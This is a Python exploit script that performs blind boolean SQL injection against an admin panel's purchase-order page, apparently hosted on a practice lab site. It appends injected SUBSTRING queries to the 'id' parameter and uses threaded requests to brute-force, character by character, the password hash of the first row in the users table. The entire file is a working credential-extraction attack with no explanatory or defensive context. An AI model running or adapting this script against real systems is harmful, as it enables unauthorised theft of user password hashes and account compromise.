import requests
import string
import concurrent.futures

base_url = "https://livelabs.0x4148.com/sms/admin/?page=purchase_order/view_po&id=1"

chars = string.ascii_letters + string.digits + string.punctuation

password_length = 32

password_hash = ""

session = requests.Session()

def test_char(i, char):
    payload = f"' AND (SELECT substring(password,{i},1) FROM users LIMIT 1)='{char}'-- -"
    full_url = f"{base_url}{requests.utils.quote(payload)}"

    try:
        response = session.get(full_url)
        if "75,000.00" in response.text:  # Replace with actual indicator
            return char
    except requests.exceptions.RequestException:
        return None
    return None

for i in range(1, password_length + 1):
    found_char = None
    with concurrent.futures.ThreadPoolExecutor() as executor:
        results = executor.map(lambda char: test_char(i, char), chars)

        for result in results:
            if result:
                found_char = result
                break

    if found_char:
        password_hash += found_char
        print(f"Found character {i}: {found_char} | Password so far: {password_hash}")

print(f"Extracted password hash: {password_hash}")